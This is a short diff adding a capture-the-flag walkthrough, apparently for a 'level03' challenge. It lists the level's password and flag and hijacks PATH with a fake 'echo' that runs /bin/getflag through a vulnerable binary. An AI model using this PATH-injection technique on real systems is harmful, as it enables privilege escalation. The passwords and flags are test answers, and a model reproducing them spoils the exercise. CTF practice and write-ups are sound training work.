@@ -1,0 +1,12 @@
+su level03
+kooda2puivaav1idi4f57q8iq
+
+scp -P 4242 level03@10.12.100.78:/home/user/level03/level03 .
+password: kooda2puivaav1idi4f57q8iq
+
+let's inject a fake echo into the system
+chmod 777 .
+echo "/bin/getflag" > echo
+chmod +x echo
+PATH=/home/user/level03:$PATH
+./level03 -> qi0maab88jeaj46qoumi7maus
